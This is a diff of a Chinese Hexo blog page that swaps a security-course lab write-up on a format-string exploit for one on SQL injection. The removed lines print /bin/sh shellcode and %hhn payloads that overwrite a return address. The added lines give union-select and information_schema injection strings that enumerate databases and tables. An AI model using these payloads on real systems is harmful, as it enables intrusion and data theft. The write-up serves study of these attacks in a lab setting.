@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>安全攻防综合实验7 - Hexo</title>
+  <title>安全攻防综合实验8 - Hexo</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -153,8 +153,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2021-11-02 15:35">
-      2021年11月2日 下午
+    <time datetime="2021-11-09 22:06">
+      2021年11月9日 晚上
     </time>
   </div>
 
@@ -164,7 +164,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      206 字
+      425 字
     </span>
   
 
@@ -174,7 +174,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      5
        分钟
     </span>
   
@@ -205,24 +205,28 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h3 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h3><p><strong>设置环境变量</strong></p>
-<pre><code class="hljs perl">perl -e <span class="hljs-string">'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";'</span> &gt; shellcode1.bin
+              <h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>可以通过查看我的之前的blog：<a href="https://jhl328.github.io/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/" target="_blank" rel="noopener">https://jhl328.github.io/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</a></p>
+<p>首先，查看<code>source code</code></p>
+<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>可以看到用的是<code>post</code>方法来获取参数，用户只能通过选择来进行，不能进行输入</p>
+<p>当我们输入id（例如：1）之后，所构造的SQL的完整语句就是</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span>;</code></pre>
 
-export SHELLCODE=<span class="hljs-string">`perl -e 'print "\x90"x100;'`</span><span class="hljs-string">`cat shellcode1.bin`</span></code></pre>
+<p>意思是在名为<code>users</code>的表中找到<code>user_id</code>这个列中内容为<code>&quot;1&quot;</code>的那一条数据的<code>first_name</code>以及<code>last_name</code>的值</p>
+<p>所以之后我们可以通过控制输入的参数id的值来调整执行的SQL语句</p>
+<p>输入<code>1&#39; order by 1#</code>，此时php所要执行的SQL语句就变为了</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">#';</span></code></pre>
 
-<p><strong>查看环境变量存储位置</strong></p>
-<p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/2.png" srcset="/img/loading.gif" alt="2"></p>
-<p>之后编译并且运行<code>get_env</code>，查看环境变量所在位置</p>
-<p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/1.png" srcset="/img/loading.gif" alt="1"></p>
-<p>利用格式化字符 <code>%hhn</code> 逐字节修改返回地址为 <code>0xffffd7a4</code> 。</p>
-<pre><code class="hljs c">./fmt_str `<span class="hljs-built_in">printf</span> <span class="hljs-string">"\x10\x34\xff\xff\x11\x34\xff\xff\x12\x34\xff\xff\x13\x34\xff\xff"</span>`%<span class="hljs-number">3</span>\$<span class="hljs-number">148</span>x%<span class="hljs-number">4</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">51</span>x%<span class="hljs-number">5</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">40</span>x%<span class="hljs-number">6</span>\$hhn%<span class="hljs-number">7</span>\$hhn</code></pre>
-
-<p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/3.png" srcset="/img/loading.gif" alt="3"></p>
-<p>可以得到 text 的地址为 <code>0xffffd130</code> ，因此返回地址所在的地址为 <code>0xffffd130</code> + <code>0x40c</code> = <code>0xffffd53c</code></p>
-<p>之后构造<code>payload</code></p>
-<pre><code class="hljs c">./fmt_str `<span class="hljs-built_in">printf</span> <span class="hljs-string">"\x3c\xd5\xff\xff\x3d\xd5\xff\xff\x3e\xd5\xff\xff\x3f\xd5\xff\xff"</span>`%<span class="hljs-number">3</span>\$<span class="hljs-number">148</span>x%<span class="hljs-number">4</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">51</span>x%<span class="hljs-number">5</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">40</span>x%<span class="hljs-number">6</span>\$hhn%<span class="hljs-number">7</span>\$hhn</code></pre>
-
-<p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>此时SQL会把#后面内容屏蔽来避免语句错误，但是此时会发现提示语法错误，会发现是由于’ 被转义为了\，之后注入的时候只需要输入<code>1 order by 1#</code>即可</p>
+<p>同时测试<code>1 order by 2#</code>，发现也成功，但是到了order by 3#的时候，会发现出现错误，说明这个名为<code>users</code>的表应该是2列</p>
+<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>接下来可以查看所有的数据库，输入<code>1 union select database(),user()</code></p>
+<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>之后就能够通过上面相同的形式来查看表， <code>union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
+<p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>之后如果要查询当前表名的所有列，注意要进行转义，通过16进制可以实现</p>
+<p>之后high在本质上只是通过⼀个中转的session，通过向这个session的url注⼊，报错回显显示在之前的那个url⽽已。其实做法都一样</p>
 
             </article>
             <hr>
@@ -246,18 +250,12 @@ export SHELLCODE=<span class="hljs-string">`perl -e 'print "\x90"x100;'`</span><
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">安全攻防综合实验8</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/">
-                        <span class="hidden-mobile">安全攻防综合实验六</span>
+                      <a href="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/">
+                        <span class="hidden-mobile">安全攻防综合实验7</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -396,7 +394,7 @@ export SHELLCODE=<span class="hljs-string">`perl -e 'print "\x90"x100;'`</span><
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "安全攻防综合实验7&nbsp;",
+        "安全攻防综合实验8&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
